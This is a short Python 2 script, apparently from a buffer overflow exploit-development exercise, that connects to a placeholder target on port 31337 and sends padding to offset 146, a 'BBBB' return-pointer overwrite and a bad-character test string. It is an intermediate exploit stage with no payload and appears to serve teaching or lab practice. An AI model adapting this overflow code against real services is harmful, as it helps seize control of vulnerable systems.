#!/usr/bin/env python2
import socket

RHOST = "<target-ip-here>"
RPORT = 31337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

badchar_test = "" # starting with an empty string
badchars = [0x00, 0x0A] # We already know that the null byte is bad because
			# they terminate strings, and the new line byte is
			# a delimiter for the handleConnection() method.

# Generating the string to be sent
for i in range(0x00, 0xFF + 1):
	if i not in badchars:
		badchar_test += chr(i)

# open a file for writing ("w") the string as binary ("b") data
with open("badchar_test.bin", "wb") as f:
	f.write(badchar_test)

buf_totlen = 1024
offset_srp = 146

buf = ""
buf += "A" * (offset_srp - len(buf)) # padding
buf += "BBBB" 			     # SRP overwrite
buf += badchar_test		     # ESP points here
buf += "D" * (buf_totlen - len(buf)) # trailing padding to keep the buffer the same length
buf += "\n"

s.send(buf)
